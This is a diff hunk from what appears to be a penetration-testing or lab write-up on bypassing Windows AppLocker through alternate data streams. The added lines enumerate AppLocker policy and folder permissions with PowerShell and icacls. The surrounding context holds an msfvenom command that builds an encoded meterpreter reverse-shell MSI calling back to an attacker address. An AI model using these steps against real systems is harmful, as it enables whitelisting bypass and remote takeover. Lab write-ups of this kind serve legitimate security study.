@@ -507,6 +507,13 @@ It is enabled for Local User and Machine as well. I have had the failed attempt 
 
 [AppLocker - Putting Data in the Alternate Data Stream AppLocker](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/)
 
+One of the thing I was trying to figure out is mention in `AppLocker Bypass using Alternate Data Stream` link is trying to figure out who has what level of access on the folders using `icacls`.
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections # This command is to pull out group policy for AppLocker
+
+icacls "C:\Windows\Temp\*"
+```
+
 Following to that I generate the `msfvenom` payload using the following command and started the meterpreter listener.
 ```
 # msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4321 -e x64/shikata_ga_nai -f msi -o payload.msi
